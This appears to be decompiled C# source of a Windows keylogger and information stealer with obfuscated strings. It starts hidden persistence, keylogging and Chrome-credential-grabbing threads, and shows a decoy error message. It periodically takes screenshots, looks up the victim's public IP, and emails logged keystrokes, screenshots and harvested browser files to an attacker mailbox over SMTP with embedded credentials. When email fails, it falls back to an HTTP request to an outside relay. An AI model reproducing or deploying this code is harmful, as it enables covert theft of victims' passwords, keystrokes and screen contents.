using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using My;

public class CMFVPTX
{
	public static string YBXCIO;

	public static string UBCOIK;

	public static string NSLICK;

	public static string OTOQUL;

	public static string USRSFT;

	public static string CGXUGF;

	public static string GXHHSQ;

	public static string TTIUSW;

	public static string GJOJFO;

	public static string QECQVQ;

	public static string MORBQW;

	public static string LFMYTK;

	public static string JDLTJK;

	public static string GXDYQP = "";

	public static string MBLHT = WOGVCL.TGKKNH("iqKktKmErKSFnoWUp7Fle6KrMQ==", "False");

	public static string FRNFY = WOGVCL.TGKKNH("c1Wlq3JgYqmWMQ==", "False");

	public static string WUFDB = WOGVCL.TGKKNH("jKGztmaAoaCvpEeXrrMx", "False");

	public static int EKFYV = 587;

	public static string OSEHB = WOGVCL.TGKKNH("DLEXSite", "False");

	public static string UTTIL = WOGVCL.TGKKNH("iK+6vXlPaig=", "False");

	public static string OUOFF = WOGVCL.TGKKNH("KA==", "False");

	public static string JOJNL = WOGVCL.TGKKNH("ZKy3u7BZWnXEbk9qfoRvTyg=", "False");

	public static string OCOFY = WOGVCL.TGKKNH("eKW1sq+Yr2ehpZOysLGllFyqvbWNoGe8r5Vcs72hhVyUoYNUbnWSjG1qZyg=", "False");

	public static string XYVKU = WOGVCL.TGKKNH("lc7c0wk=", "False");

	public static string YHFRB = WOGVCL.TGKKNH("g7nP3cEJ", "False");

	public static int JRDDH = 3000000;

	public static string KOIIU = "";

	public static string IKKVKS = "";

	public static int number = 0;

	public static FLOUNLNG URSYJMKR;

	public static Thread NGPJWMFR = new Thread(WSDQSBLK);

	public static Thread GCThread = new Thread(DAChrome.GTCHRME);

	public static Thread SPTEUFXC = new Thread(HYURLSHJ);

	public static Thread STRTTHRD = new Thread(DAStartup.Startupdll.StartPers);

	[STAThread]
	public static void Main()
	{
		//IL_023e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0270: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0306: Unknown result type (might be due to invalid IL or missing references)
		//IL_0338: Unknown result type (might be due to invalid IL or missing references)
		//IL_036a: Unknown result type (might be due to invalid IL or missing references)
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f4: Unknown result type (might be due to invalid IL or missing references)
		int num = default(int);
		try
		{
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			STRTTHRD.IsBackground = true;
			STRTTHRD.Start();
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			num = 1;
			try
			{
				if (num2 == 3)
				{
					Application.Restart();
				}
				URSYJMKR = new FLOUNLNG(IKKVKS);
				FLOUNLNG.PMRWJIIE();
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5, num);
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
		try
		{
			NGPJWMFR.IsBackground = true;
			NGPJWMFR.Start();
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			string oUOFF = OUOFF;
			if (Operators.CompareString(oUOFF, WOGVCL.TGKKNH("ltLc2gI=", "False"), false) == 0)
			{
				MessageBox.Show(OCOFY, JOJNL, (MessageBoxButtons)0, (MessageBoxIcon)0);
			}
			else if (Operators.CompareString(oUOFF, WOGVCL.TGKKNH("h6zIy7ieshg=", "False"), false) == 0)
			{
				MessageBox.Show(OCOFY, JOJNL, (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else if (Operators.CompareString(oUOFF, WOGVCL.TGKKNH("c8G3x66bqsjEvJwZ", "False"), false) == 0)
			{
				MessageBox.Show(OCOFY, JOJNL, (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else if (Operators.CompareString(oUOFF, WOGVCL.TGKKNH("bqqwuC8=", "False"), false) == 0)
			{
				MessageBox.Show(OCOFY, JOJNL, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(oUOFF, WOGVCL.TGKKNH("W6Ousqcw", "False"), false) == 0)
			{
				MessageBox.Show(OCOFY, JOJNL, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(oUOFF, WOGVCL.TGKKNH("kdDL4NOpytQJ", "False"), false) == 0)
			{
				MessageBox.Show(OCOFY, JOJNL, (MessageBoxButtons)0, (MessageBoxIcon)32);
			}
			else if (Operators.CompareString(oUOFF, WOGVCL.TGKKNH("cKS8uSI=", "False"), false) == 0)
			{
				MessageBox.Show(OCOFY, JOJNL, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(oUOFF, WOGVCL.TGKKNH("h9Tg2Nev1NcD", "False"), false) == 0)
			{
				MessageBox.Show(OCOFY, JOJNL, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else if (Operators.CompareString(oUOFF, WOGVCL.TGKKNH("b6+ywreTosC8tJQh", "False"), false) == 0)
			{
				MessageBox.Show(OCOFY, JOJNL, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else
			{
				MessageBox.Show(WOGVCL.TGKKNH("mc3V39K7zYq21bbO3JGyp8Lf48iojYrBz6nA3daDq86K5dJkx97l036Omd7Mp9HZ5NKq05jU0rF/0ODVZMzZ48hkx8/d03ID", "False"), WOGVCL.TGKKNH("i7/H0cStv3yox6jAzhM=", "False"), (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			GCThread.IsBackground = true;
			GCThread.Start();
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			SPTEUFXC.IsBackground = true;
			SPTEUFXC.Start();
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9, num);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void QKXQNG(ref double SNOGMSTK)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(SNOGMSTK);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void WSDQSBLK()
	{
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Expected O, but got Unknown
		string text = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(JRDDH);
				text = "";
				string text2 = "";
				double SNOGMSTK = 0.2;
				QKXQNG(ref SNOGMSTK);
				try
				{
					WebClient webClient = new WebClient();
					text2 = WOGVCL.TGKKNH("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(WOGVCL.TGKKNH("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + WOGVCL.TGKKNH("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				SNOGMSTK = 1.0;
				QKXQNG(ref SNOGMSTK);
				try
				{
					if (Operators.CompareString(XYVKU, WOGVCL.TGKKNH("mNHf1gY=", "False"), false) == 0)
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
						Bitmap val3 = val;
						((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + WOGVCL.TGKKNH("ZsPMzBI=", "False"));
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				SNOGMSTK = 0.3;
				QKXQNG(ref SNOGMSTK);
				try
				{
					if (Operators.CompareString(IKKVKS, "", false) != 0)
					{
						KOIIU = WOGVCL.TGKKNH("fHiEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYSLYG2rrsFgXnmEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYWrKQ==", "False") + Environment.NewLine + Environment.NewLine + IKKVKS + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						try
						{
							MailMessage mailMessage = new MailMessage();
							MailMessage mailMessage2 = mailMessage;
							mailMessage2.From = new MailAddress(MBLHT);
							mailMessage2.To.Add(MBLHT);
							mailMessage2.Subject = WOGVCL.TGKKNH("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + WOGVCL.TGKKNH("aQ0=", "False") + Environment.MachineName.ToString();
							mailMessage2.Body = KOIIU;
							try
							{
								if (Operators.CompareString(XYVKU, WOGVCL.TGKKNH("mNHf1gY=", "False"), false) == 0)
								{
									Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + WOGVCL.TGKKNH("ZsPMzBI=", "False"));
									mailMessage2.Attachments.Add(item);
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							mailMessage2 = null;
							SmtpClient smtpClient = new SmtpClient(WUFDB);
							SmtpClient smtpClient2 = smtpClient;
							smtpClient2.Port = EKFYV;
							smtpClient2.EnableSsl = true;
							smtpClient2.Credentials = new NetworkCredential(MBLHT, FRNFY);
							smtpClient2.Send(mailMessage);
							smtpClient2 = null;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							try
							{
								string text3 = WOGVCL.TGKKNH("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
								_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + MBLHT + "&subject=" + Strings.Replace(WOGVCL.TGKKNH("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + WOGVCL.TGKKNH("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(KOIIU, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + MBLHT).GetResponse();
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				KOIIU = "";
				IKKVKS = "";
				GXDYQP = "";
				number++;
			}
		}
	}

	public static void HYURLSHJ()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("eoatrq+NrLOxsXp7pa6ok6m3pyw=", WOGVCL.TGKKNH("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("eoatrq+NrLOxsXp7pa6ok6m3pyw=", WOGVCL.TGKKNH("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			double SNOGMSTK = 25.0;
			QKXQNG(ref SNOGMSTK);
			string text = WOGVCL.TGKKNH("lZGdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3krPbvpvBxdnMd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ4sg4=", "False") + Environment.NewLine + Environment.NewLine + YBXCIO + Environment.NewLine + Environment.NewLine + UBCOIK + Environment.NewLine + Environment.NewLine + NSLICK + Environment.NewLine + Environment.NewLine + OTOQUL + Environment.NewLine + Environment.NewLine + USRSFT + Environment.NewLine + Environment.NewLine + CGXUGF + Environment.NewLine + Environment.NewLine + GXHHSQ + Environment.NewLine + Environment.NewLine + TTIUSW + Environment.NewLine + Environment.NewLine + QECQVQ + Environment.NewLine + Environment.NewLine + MORBQW + Environment.NewLine + Environment.NewLine + LFMYTK + Environment.NewLine + Environment.NewLine + JDLTJK + Environment.NewLine + Environment.NewLine + WOGVCL.TGKKNH("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(MBLHT);
				mailMessage2.To.Add(MBLHT);
				mailMessage2.Subject = WOGVCL.TGKKNH("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + WOGVCL.TGKKNH("aQ0=", WOGVCL.TGKKNH("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(WUFDB);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = EKFYV;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(MBLHT, FRNFY);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = WOGVCL.TGKKNH("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + MBLHT + "&subject=" + Strings.Replace(WOGVCL.TGKKNH("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + WOGVCL.TGKKNH("aQ0=", WOGVCL.TGKKNH("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + MBLHT).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}
}
